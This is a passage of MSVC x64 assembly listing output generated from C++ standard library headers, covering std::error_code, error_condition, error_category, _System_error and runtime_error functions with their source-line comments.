	lea	rdi, QWORD PTR [rax+24]
	mov	rsi, QWORD PTR _Errcode$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 168				; 000000a8H
	pop	rdi
	pop	rsi
	ret	0
??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_System_error::_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
tv131 = 40
tv69 = 48
tv133 = 56
$T2 = 64
$T3 = 80
$T4 = 112
__$ArrayPad$ = 144
this$ = 192
_Errcode$ = 200
_Message$ = 208
?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA PROC ; `std::_System_error::_System_error'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T4[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z@4HA ENDP ; `std::_System_error::_System_error'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
_TEXT	SEGMENT
$T1 = 32
tv79 = 40
tv84 = 48
$T2 = 56
__$ArrayPad$ = 88
__$ReturnUdt$ = 112
_Errcode$ = 120
_Message$ = 128
?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z PROC ; std::_System_error::_Makestr, COMDAT

; 426  :     static string _Makestr(error_code _Errcode, string _Message) { // compose error message

$LN8:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	DWORD PTR $T1[rsp], 0

; 427  :         if (!_Message.empty()) {

	mov	rcx, QWORD PTR _Message$[rsp]
	call	?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN2@Makestr

; 428  :             _Message.append(": ");

	lea	rdx, OFFSET FLAT:??_C@_02LMMGGCAJ@?3?5@
	mov	rcx, QWORD PTR _Message$[rsp]
	call	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
$LN2@Makestr:

; 429  :         }
; 430  : 
; 431  :         _Message.append(_Errcode.message());

	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR _Errcode$[rsp]
	call	?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::error_code::message
	mov	QWORD PTR tv79[rsp], rax
	mov	rax, QWORD PTR tv79[rsp]
	mov	QWORD PTR tv84[rsp], rax
	mov	rdx, QWORD PTR tv84[rsp]
	mov	rcx, QWORD PTR _Message$[rsp]
	call	?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
	npad	1
	lea	rcx, QWORD PTR $T2[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >

; 432  :         return _Message;

	mov	rdx, QWORD PTR _Message$[rsp]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rcx, QWORD PTR _Message$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 433  :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 104				; 00000068H
	ret	0
?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ENDP ; std::_System_error::_Makestr
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
tv79 = 40
tv84 = 48
$T2 = 56
__$ArrayPad$ = 88
__$ReturnUdt$ = 112
_Errcode$ = 120
_Message$ = 128
?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA PROC ; `std::_System_error::_Makestr'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR _Message$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA ENDP ; `std::_System_error::_Makestr'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
tv79 = 40
tv84 = 48
$T2 = 56
__$ArrayPad$ = 88
__$ReturnUdt$ = 112
_Errcode$ = 120
_Message$ = 128
?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA PROC ; `std::_System_error::_Makestr'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T2[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z@4HA ENDP ; `std::_System_error::_Makestr'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??8std@@YA_NAEBVerror_condition@0@0@Z
_TEXT	SEGMENT
tv78 = 32
tv72 = 36
tv69 = 40
_Left$ = 64
_Right$ = 72
??8std@@YA_NAEBVerror_condition@0@0@Z PROC		; std::operator==, COMDAT

; 264  :     _NODISCARD_FRIEND bool operator==(const error_condition& _Left, const error_condition& _Right) noexcept {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 265  :         return _Left.category() == _Right.category() && _Left.value() == _Right.value();

	mov	rcx, QWORD PTR _Right$[rsp]
	call	?category@error_condition@std@@QEBAAEBVerror_category@2@XZ ; std::error_condition::category
	mov	QWORD PTR tv69[rsp], rax
	mov	rcx, QWORD PTR _Left$[rsp]
	call	?category@error_condition@std@@QEBAAEBVerror_category@2@XZ ; std::error_condition::category
	mov	rcx, QWORD PTR tv69[rsp]
	mov	rdx, rcx
	mov	rcx, rax
	call	??8error_category@std@@QEBA_NAEBV01@@Z	; std::error_category::operator==
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN3@operator
	mov	rcx, QWORD PTR _Left$[rsp]
	call	?value@error_condition@std@@QEBAHXZ	; std::error_condition::value
	mov	DWORD PTR tv72[rsp], eax
	mov	rcx, QWORD PTR _Right$[rsp]
	call	?value@error_condition@std@@QEBAHXZ	; std::error_condition::value
	mov	ecx, DWORD PTR tv72[rsp]
	cmp	ecx, eax
	jne	SHORT $LN3@operator
	mov	DWORD PTR tv78[rsp], 1
	jmp	SHORT $LN4@operator
$LN3@operator:
	mov	DWORD PTR tv78[rsp], 0
$LN4@operator:
	movzx	eax, BYTE PTR tv78[rsp]

; 266  :     }

	add	rsp, 56					; 00000038H
	ret	0
??8std@@YA_NAEBVerror_condition@0@0@Z ENDP		; std::operator==
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?category@error_condition@std@@QEBAAEBVerror_category@2@XZ
_TEXT	SEGMENT
this$ = 8
?category@error_condition@std@@QEBAAEBVerror_category@2@XZ PROC ; std::error_condition::category, COMDAT

; 251  :     _NODISCARD const error_category& category() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 252  :         return *_Mycat;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]

; 253  :     }

	ret	0
?category@error_condition@std@@QEBAAEBVerror_category@2@XZ ENDP ; std::error_condition::category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?value@error_condition@std@@QEBAHXZ
_TEXT	SEGMENT
this$ = 8
?value@error_condition@std@@QEBAHXZ PROC		; std::error_condition::value, COMDAT

; 247  :     _NODISCARD int value() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 248  :         return _Myval;

	mov	rax, QWORD PTR this$[rsp]
	mov	eax, DWORD PTR [rax]

; 249  :     }

	ret	0
?value@error_condition@std@@QEBAHXZ ENDP		; std::error_condition::value
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??0error_condition@std@@QEAA@HAEBVerror_category@1@@Z
_TEXT	SEGMENT
this$ = 8
_Val$ = 16
_Cat$ = 24
??0error_condition@std@@QEAA@HAEBVerror_category@1@@Z PROC ; std::error_condition::error_condition, COMDAT

; 224  :     error_condition(int _Val, const error_category& _Cat) noexcept : _Myval(_Val), _Mycat(&_Cat) {}

	mov	QWORD PTR [rsp+24], r8
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	ecx, DWORD PTR _Val$[rsp]
	mov	DWORD PTR [rax], ecx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Cat$[rsp]
	mov	QWORD PTR [rax+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0error_condition@std@@QEAA@HAEBVerror_category@1@@Z ENDP ; std::error_condition::error_condition
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
$T1 = 32
tv67 = 40
tv70 = 48
this$ = 80
__$ReturnUdt$ = 88
?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::error_code::message, COMDAT

; 166  :     _NODISCARD string message() const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H
	mov	DWORD PTR $T1[rsp], 0

; 167  :         return category().message(value());

	mov	rcx, QWORD PTR this$[rsp]
	call	?category@error_code@std@@QEBAAEBVerror_category@2@XZ ; std::error_code::category
	mov	QWORD PTR tv67[rsp], rax
	mov	rcx, QWORD PTR this$[rsp]
	call	?value@error_code@std@@QEBAHXZ		; std::error_code::value
	mov	rcx, QWORD PTR tv67[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	QWORD PTR tv70[rsp], rcx
	mov	r8d, eax
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR tv67[rsp]
	mov	rax, QWORD PTR tv70[rsp]
	call	QWORD PTR [rax+16]
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 168  :     }

	add	rsp, 72					; 00000048H
	ret	0
?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::error_code::message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?category@error_code@std@@QEBAAEBVerror_category@2@XZ
_TEXT	SEGMENT
this$ = 8
?category@error_code@std@@QEBAAEBVerror_category@2@XZ PROC ; std::error_code::category, COMDAT

; 160  :     _NODISCARD const error_category& category() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 161  :         return *_Mycat;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]

; 162  :     }

	ret	0
?category@error_code@std@@QEBAAEBVerror_category@2@XZ ENDP ; std::error_code::category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?value@error_code@std@@QEBAHXZ
_TEXT	SEGMENT
this$ = 8
?value@error_code@std@@QEBAHXZ PROC			; std::error_code::value, COMDAT

; 156  :     _NODISCARD int value() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 157  :         return _Myval;

	mov	rax, QWORD PTR this$[rsp]
	mov	eax, DWORD PTR [rax]

; 158  :     }

	ret	0
?value@error_code@std@@QEBAHXZ ENDP			; std::error_code::value
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??0error_code@std@@QEAA@HAEBVerror_category@1@@Z
_TEXT	SEGMENT
this$ = 8
_Val$ = 16
_Cat$ = 24
??0error_code@std@@QEAA@HAEBVerror_category@1@@Z PROC	; std::error_code::error_code, COMDAT

; 133  :     error_code(int _Val, const error_category& _Cat) noexcept : _Myval(_Val), _Mycat(&_Cat) {}

	mov	QWORD PTR [rsp+24], r8
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	ecx, DWORD PTR _Val$[rsp]
	mov	DWORD PTR [rax], ecx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Cat$[rsp]
	mov	QWORD PTR [rax+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0error_code@std@@QEAA@HAEBVerror_category@1@@Z ENDP	; std::error_code::error_code
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??8error_category@std@@QEBA_NAEBV01@@Z
_TEXT	SEGMENT
tv67 = 0
this$ = 32
_Right$ = 40
??8error_category@std@@QEBA_NAEBV01@@Z PROC		; std::error_category::operator==, COMDAT

; 89   :     _NODISCARD bool operator==(const error_category& _Right) const noexcept {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 90   :         return _Addr == _Right._Addr;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	cmp	QWORD PTR [rax+8], rcx
	jne	SHORT $LN3@operator
	mov	DWORD PTR tv67[rsp], 1
	jmp	SHORT $LN4@operator
$LN3@operator:
	mov	DWORD PTR tv67[rsp], 0
$LN4@operator:
	movzx	eax, BYTE PTR tv67[rsp]

; 91   :     }

	add	rsp, 24
	ret	0
??8error_category@std@@QEBA_NAEBV01@@Z ENDP		; std::error_category::operator==
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z
_TEXT	SEGMENT
tv74 = 32
this$ = 64
_Code$ = 72
_Errval$ = 80
?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z PROC ; std::error_category::equivalent, COMDAT

; 379  : _NODISCARD inline bool error_category::equivalent(const error_code& _Code, int _Errval) const noexcept {

$LN5:
	mov	DWORD PTR [rsp+24], r8d
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 380  :     return *this == _Code.category() && _Code.value() == _Errval;

	mov	rcx, QWORD PTR _Code$[rsp]
	call	?category@error_code@std@@QEBAAEBVerror_category@2@XZ ; std::error_code::category
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??8error_category@std@@QEBA_NAEBV01@@Z	; std::error_category::operator==
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN3@equivalent
	mov	rcx, QWORD PTR _Code$[rsp]
	call	?value@error_code@std@@QEBAHXZ		; std::error_code::value
	cmp	eax, DWORD PTR _Errval$[rsp]
	jne	SHORT $LN3@equivalent
	mov	DWORD PTR tv74[rsp], 1
	jmp	SHORT $LN4@equivalent
$LN3@equivalent:
	mov	DWORD PTR tv74[rsp], 0
$LN4@equivalent:
	movzx	eax, BYTE PTR tv74[rsp]

; 381  : }

	add	rsp, 56					; 00000038H
	ret	0
?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z ENDP ; std::error_category::equivalent
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Errval$ = 72
_Cond$ = 80
?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z PROC ; std::error_category::equivalent, COMDAT

; 375  : _NODISCARD inline bool error_category::equivalent(int _Errval, const error_condition& _Cond) const noexcept {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 376  :     return default_error_condition(_Errval) == _Cond;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	r8d, DWORD PTR _Errval$[rsp]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+24]
	mov	rdx, QWORD PTR _Cond$[rsp]
	mov	rcx, rax
	call	??8std@@YA_NAEBVerror_condition@0@0@Z	; std::operator==

; 377  : }

	add	rsp, 56					; 00000038H
	ret	0
?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z ENDP ; std::error_category::equivalent
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z
_TEXT	SEGMENT
this$ = 48
__$ReturnUdt$ = 56
_Errval$ = 64
?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z PROC ; std::error_category::default_error_condition, COMDAT

; 370  : _NODISCARD inline error_condition error_category::default_error_condition(int _Errval) const noexcept {

$LN3:
	mov	DWORD PTR [rsp+24], r8d
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 371  :     // make error_condition for error code
; 372  :     return error_condition(_Errval, *this);

	mov	r8, QWORD PTR this$[rsp]
	mov	edx, DWORD PTR _Errval$[rsp]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0error_condition@std@@QEAA@HAEBVerror_category@1@@Z ; std::error_condition::error_condition
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 373  : }

	add	rsp, 40					; 00000028H
	ret	0
?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z ENDP ; std::error_category::default_error_condition
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??1error_category@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1error_category@std@@UEAA@XZ PROC			; std::error_category::~error_category, COMDAT

; 77   :         virtual ~error_category() noexcept = default;

	mov	QWORD PTR [rsp+8], rcx
	ret	0
??1error_category@std@@UEAA@XZ ENDP			; std::error_category::~error_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?iostream_category@std@@YAAEBVerror_category@1@XZ
_TEXT	SEGMENT
?iostream_category@std@@YAAEBVerror_category@1@XZ PROC	; std::iostream_category, COMDAT

; 661  : _NODISCARD inline const error_category& iostream_category() noexcept {

$LN3:
	sub	rsp, 40					; 00000028H

; 662  :     return _Immortalize_memcpy_image<_Iostream_error_category2>();

	call	??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@0@XZ ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>

; 663  : }

	add	rsp, 40					; 00000028H
	ret	0
?iostream_category@std@@YAAEBVerror_category@1@XZ ENDP	; std::iostream_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 48
_Ec$ = 56
?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z PROC ; std::make_error_code, COMDAT

; 392  : _NODISCARD inline error_code make_error_code(io_errc _Ec) noexcept {

$LN3:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 393  :     return error_code(static_cast<int>(_Ec), _STD iostream_category());

	call	?iostream_category@std@@YAAEBVerror_category@1@XZ ; std::iostream_category
	mov	r8, rax
	mov	edx, DWORD PTR _Ec$[rsp]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0error_code@std@@QEAA@HAEBVerror_category@1@@Z ; std::error_code::error_code
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 394  : }

	add	rsp, 40					; 00000028H
	ret	0
?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ENDP ; std::make_error_code
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gruntime_error@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gruntime_error@std@@UEAAPEAXI@Z PROC			; std::runtime_error::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1runtime_error@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 24
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gruntime_error@std@@UEAAPEAXI@Z ENDP			; std::runtime_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0runtime_error@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0runtime_error@std@@QEAA@AEBV01@@Z PROC		; std::runtime_error::runtime_error, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0exception@std@@QEAA@AEBV01@@Z	; std::exception::exception
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7runtime_error@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0runtime_error@std@@QEAA@AEBV01@@Z ENDP		; std::runtime_error::runtime_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1runtime_error@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1runtime_error@std@@UEAA@XZ PROC			; std::runtime_error::~runtime_error, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1exception@std@@UEAA@XZ		; std::exception::~exception
	add	rsp, 40					; 00000028H
	ret	0
??1runtime_error@std@@UEAA@XZ ENDP			; std::runtime_error::~runtime_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\stdexcept
;	COMDAT ??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
this$ = 48
_Message$ = 56
??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::runtime_error::runtime_error, COMDAT

; 105  :     explicit runtime_error(const string& _Message) : _Mybase(_Message.c_str()) {}

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR _Message$[rsp]
	call	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??0exception@std@@QEAA@QEBD@Z		; std::exception::exception
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7runtime_error@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::runtime_error::runtime_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
